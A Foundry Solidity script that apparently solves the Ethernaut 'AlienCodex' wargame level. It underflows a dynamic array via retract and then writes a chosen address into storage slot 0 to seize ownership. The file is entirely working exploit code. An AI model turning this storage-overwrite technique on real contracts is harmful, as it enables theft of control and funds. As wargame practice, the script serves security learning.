// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract AlienCodexExploit is Script {
    function run() public {
        address newOwner = vm.envAddress("NEW_OWNER");
        address contractAddress = vm.envAddress("CONTRACT");

        vm.startBroadcast();
        exploit(IAlienCodex(contractAddress), newOwner);
        vm.stopBroadcast();
    }
}

interface IAlienCodex {
    function owner() external view returns(address);
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

function exploit(IAlienCodex _target, address _newOwner) {
    _target.makeContact();
    _target.retract();
    uint256 slot = uint256(keccak256(abi.encode(1)));
    uint256 index = type(uint256).max - slot + 1;
    _target.revise(index, bytes32(uint256(uint160(_newOwner))));
}
